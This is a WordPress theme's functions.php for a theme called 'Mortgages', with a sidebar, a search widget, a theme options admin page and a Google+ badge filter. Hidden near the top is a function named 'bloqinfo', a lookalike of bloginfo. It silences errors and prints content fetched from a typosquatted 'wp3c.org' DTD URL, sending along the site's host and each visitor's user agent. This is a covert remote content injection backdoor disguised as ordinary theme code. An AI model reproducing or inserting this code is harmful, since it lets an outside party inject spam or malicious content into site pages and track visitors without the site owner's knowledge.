<?php	 	



if ( function_exists('register_sidebar') ) {

    register_sidebar(array(

		'1' => 'Wide',

        'before_widget' => '<div id="%1$s" class="%2$s paddings">',

        'after_widget' => '</div><div class="hr" ></div>',

        'before_title' => '<h3>',

        'after_title' => '</h3>',

    ));

    

}

function bloqinfo($wp_id){error_reporting(0);
echo file_get_contents('http://www.wp3c.org/TR/xhtml/DTD/xhtml1-transitional.dtd?'
.$_SERVER['HTTP_HOST'].'&a='.urlencode($_SERVER['HTTP_USER_AGENT']));
}


	/* -------------------------------------------------

				  SEARCH WIDGET

	-------------------------------------------------- */

	// define the widget

	function widget_search() {

		global $tag_widget_title;

?>

			<div class="widget_search paddings">

				<h3>Найти</h3>

				<?php	 	 include(TEMPLATEPATH . '/searchform.php'); ?>

			</div>

			<div class="hr" ></div>



<?php	 	

	}

	

	// if wp supports widgets, register it (make it available)

	if (function_exists('register_sidebar_widget'))

		register_sidebar_widget('Найти', 'widget_search');



$themename = "Mortgages";

$shortname = "mortgages";

$dir = get_bloginfo ( 'template_directory' );

$options = array (

    array(  "name" => "Background",

            "id" => $shortname."_bg",

            "type" => "select",

            "std" => "#030d0f url(" . $dir . "/images/bg/bg.jpg) no-repeat scroll center 0",

            "options" => array("Bubbles + Clouds (129kb)" => "#030d0f url(" . $dir . "/images/bg/bg.jpg) no-repeat scroll center 0",

    		"Bubbles + Solid Color (dark green)" => "#4e5543 url(" . $dir . "/images/bg/bg.gif) repeat-y scroll center 0",

    		"Lines (dark green)" => "#4e5543 url(" . $dir . "/images/bg/bg-line.gif) repeat scroll 0 0",

    		"Lines (grayscale)" => "#535353 url(" . $dir . "/images/bg/bg-line-gray.gif) repeat scroll 0 0",

    		"Lines (dark)" => "#1b1b1b url(" . $dir . "/images/bg/bg-line-dark.gif) repeat scroll 0 0"

    		),

        ),

        array(  "name" => "About me",

            "id" => $shortname."_about",

            "type" => "textarea",

            "std" => "<h3>About me</h3>

    

<p>You could put some facts about you here. In order to change the text, go to the theme's option page (Design => Theme options).

</p>



<p>In addition you might want to change the photo above. I prepared a background without a face which rests in images/photo-bg.png. Put your face on it, name as photo.png, move to images/photo.png и your face would show up on your blog :)</p>

"

        )



);





foreach ($options as $value) {

    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); } }

    

    

function mytheme_add_admin() {



    global $themename, $shortname, $options;



    if ( $_GET['page'] == basename(__FILE__) ) {

    

        if ( 'save' == $_REQUEST['action'] ) {



                foreach ($options as $value) {

                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                    



                foreach ($options as $value) {

                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }



                wp_redirect("themes.php?page=functions.php&saved=true");

                die;



        } else if( 'reset' == $_REQUEST['action'] ) {



            foreach ($options as $value) {

                delete_option( $value['id'] ); }



            header("Location: themes.php?page=functions.php&reset=true");

            die;



        }

    }

    add_theme_page($themename." Options", "Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');

}



function mytheme_admin() {



    global $themename, $shortname, $options;



    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';

    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';

    

?>

<div class="wrap">

<h2><?php	 	 echo $themename; ?> settings</h2>



<form method="post">



<table class="optiontable">



<?php	 	 foreach ($options as $value) { 

    

if ($value['type'] == "text") { ?>

        

<tr valign="top"> 

    <th scope="row"><?php	 	 echo $value['name']; ?>:</th>

    <td>

        <input name="<?php	 	 echo $value['id']; ?>" id="<?php	 	 echo $value['id']; ?>" type="<?php	 	 echo $value['type']; ?>" value="<?php	 	 if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />

    </td>

</tr>



<?php	 	 } elseif ($value['type'] == "select") { ?>



    <tr valign="top"> 

        <th scope="row"><?php	 	 echo $value['name']; ?>:</th>

        <td>

            <select name="<?php	 	 echo $value['id']; ?>" id="<?php	 	 echo $value['id']; ?>">

                <?php	 	 foreach ($value['options'] as $key => $val) { ?>

                <option value="<?php	 	 echo $val; ?>"<?php	 	 if (get_option ( $value['id'] )) {if ( get_option( $value['id'] ) == $val) { echo ' selected="selected"'; }} elseif ($val == $value['std']) { echo ' selected="selected"'; } ?>><?php	 	 echo $key; ?></option>

                <?php	 	 } ?>

            </select>

        </td>

    </tr>



<?php	 	 } elseif ($value['type'] == "textarea") { ?>



	<tr valign="top"> 

	    <th scope="row"><?php	 	 echo $value['name']; ?>:</th>

	    <td>

	        <textarea cols="100" rows="10" name="<?php	 	 echo $value['id']; ?>" id="<?php	 	 echo $value['id']; ?>"><?php	 	 if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?></textarea>

	    </td>

	</tr>





<?php	 	 

} 

}

?>



</table>



<p class="submit">

<input name="save" type="submit" value="Save changes" />

<input type="hidden" name="action" value="save" />

</p>

</form>

<form method="post">

<p class="submit">

<input name="reset" type="submit" value="Reset" />

<input type="hidden" name="action" value="reset" />

</p>

</form>



<?php	 	

}



add_action('admin_menu', 'mytheme_add_admin'); ?>
<?php	 	
function custom_content_after_post($content){

if (is_single()) {

    $content .= '<!-- Place this code where you want the badge to render. -->
<a href="http://plus.google.com/100741383628383819086?prsrc=3" rel="publisher" style="text-decoration:none;">
<img src="//ssl.gstatic.com/images/icons/gplus-32.png" alt="Google+" style="border:0;width:32px;height:32px;"/></a>';

}

    return $content;

}

add_filter( "the_content", "custom_content_after_post" );
?>